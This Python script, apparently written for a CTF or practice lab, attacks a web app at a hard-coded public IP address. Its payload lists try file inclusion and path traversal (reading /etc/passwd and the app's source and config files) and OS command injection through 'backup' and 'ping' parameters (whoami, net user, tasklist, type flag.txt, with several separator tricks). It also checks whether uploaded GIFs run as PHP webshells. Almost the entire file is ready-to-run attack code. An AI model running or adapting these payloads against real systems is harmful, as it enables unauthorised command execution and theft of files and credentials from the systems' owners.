import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_file_include_deep():
    """深入测试文件包含"""
    print_section("1. 文件包含深入测试")
    
    include_url = f"{TARGET}/include"
    
    # 获取include页面内容，了解白名单
    r = session.get(include_url, params={"page": "welcome"}, timeout=TIMEOUT)
    print(f"  欢迎页面内容:\n{r.text[:500]}")
    
    # 测试各种路径遍历方式
    include_payloads = [
        "welcome",
        "/uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "/uploads/572279e9bc5c4cf79d754e57fb2e38bf.gif",
        "/uploads/d0fa8509503c438a872c3364419d210c.gif",
        "../uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "../../uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "welcome/../uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "./welcome/../uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
        ".\\uploads\\4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "/flag",
        "/flag.txt",
        "../flag",
        "../../flag",
        "../flag.txt",
        "../../flag.txt",
        "/etc/passwd",
        "../etc/passwd",
        "../../etc/passwd",
        "/app.py",
        "../app.py",
        "../../app.py",
        "/main.py",
        "../main.py",
        "../../main.py",
        "/config.py",
        "../config.py",
        "../../config.py",
    ]
    
    for payload in include_payloads:
        try:
            r = session.get(include_url, params={"page": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text
                
                # 检查是否有命令执行结果
                if any(keyword in content for keyword in ["system", "whoami", "root", "flag", "DIRECTORY"]):
                    print(f"\n  [{r.status_code}] ?page={payload}")
                    print(f"     响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG: {flag_match.group(0)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_backup_command_exec():
    """测试Backup命令执行"""
    print_section("2. Backup命令执行测试")
    
    backup_url = f"{TARGET}/backup"
    
    # 从之前的测试发现，backup只允许uploads目录
    # 但是可以尝试各种命令注入方式
    
    backup_payloads = [
        "F:\\small peoject\\python-lab\\uploads",
        "F:\\small peoject\\python-lab\\uploads;",
        "F:\\small peoject\\python-lab\\uploads; type F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads; type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads; type C:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads; dir F:\\",
        "F:\\small peoject\\python-lab\\uploads; dir C:\\",
        "F:\\small peoject\\python-lab\\uploads; whoami",
        "F:\\small peoject\\python-lab\\uploads; ipconfig",
        "F:\\small peoject\\python-lab\\uploads; findstr /m flag F:\\*.txt",
        "F:\\small peoject\\python-lab\\uploads; findstr /m flag C:\\*.txt",
        "F:\\small peoject\\python-lab\\uploads; net user",
        "F:\\small peoject\\python-lab\\uploads; tasklist",
        "F:\\small peoject\\python-lab\\uploads; getenv",
        "F:\\small peoject\\python-lab\\uploads; echo %USERNAME%",
        "F:\\small peoject\\python-lab\\uploads; echo %PATH%",
        # 尝试其他分隔符
        "F:\\small peoject\\python-lab\\uploads&&type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads|type F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads`type F:\\flag.txt`",
        "F:\\small peoject\\python-lab\\uploads$(type F:\\flag.txt)",
        # 尝试路径遍历
        "F:\\small peoject\\python-lab\\uploads\\..\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads\\..\\..\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads/../flag.txt",
        "F:\\small peoject\\python-lab\\uploads/../../flag.txt",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 50:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_ping_command_exec():
    """测试Ping命令执行"""
    print_section("3. Ping命令执行测试")
    
    ping_url = f"{TARGET}/ping"
    
    # 尝试各种命令注入方式
    ping_payloads = [
        "127.0.0.1",
        "127.0.0.1; type F:\\small peoject\\python-lab\\flag.txt",
        "127.0.0.1; type F:\\flag.txt",
        "127.0.0.1; type C:\\flag.txt",
        "127.0.0.1; dir F:\\",
        "127.0.0.1; dir C:\\",
        "127.0.0.1; whoami",
        "127.0.0.1; ipconfig",
        "127.0.0.1; findstr /m flag F:\\*.txt",
        "127.0.0.1; findstr /m flag C:\\*.txt",
        "127.0.0.1; net user",
        "127.0.0.1; tasklist",
        "127.0.0.1; getenv",
        "127.0.0.1; echo %USERNAME%",
        "127.0.0.1; echo %PATH%",
        # 其他分隔符
        "127.0.0.1&&type F:\\flag.txt",
        "127.0.0.1|type F:\\flag.txt",
        "127.0.0.1`type F:\\flag.txt`",
        "127.0.0.1$(type F:\\flag.txt)",
        # 尝试绕过IP验证
        "localhost; type F:\\flag.txt",
        "127.1; type F:\\flag.txt",
        "127.0.0.1.1; type F:\\flag.txt",
        "[127.0.0.1]; type F:\\flag.txt",
        "0; type F:\\flag.txt",
        "0.0.0.0; type F:\\flag.txt",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 100:
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"     🚩 FLAG: {flag_match.group(0)}")
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_uploaded_gif_execution():
    """测试上传的GIF文件是否可以执行"""
    print_section("4. 测试上传GIF文件执行")
    
    uploaded_files = [
        "4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "572279e9bc5c4cf79d754e57fb2e38bf.gif",
        "d0fa8509503c438a872c3364419d210c.gif",
    ]
    
    for filename in uploaded_files:
        # 尝试直接访问
        url = f"{TARGET}/uploads/{filename}"
        try:
            r = session.get(url, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content_type = r.headers.get('Content-Type', '')
                print(f"\n  [{r.status_code}] /uploads/{filename}")
                print(f"     Content-Type: {content_type}")
                print(f"     内容: {r.text[:200]}")
                
                # 检查是否执行了PHP
                if "nt authority" in r.text.lower() or "system32" in r.text.lower():
                    print(f"     ⚠️  PHP代码被执行!")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
                    if flag_match:
                        print(f"     🚩 FLAG: {flag_match.group(0)}")
                        
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_file_include_deep()
    test_backup_command_exec()
    test_ping_command_exec()
    test_uploaded_gif_execution()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()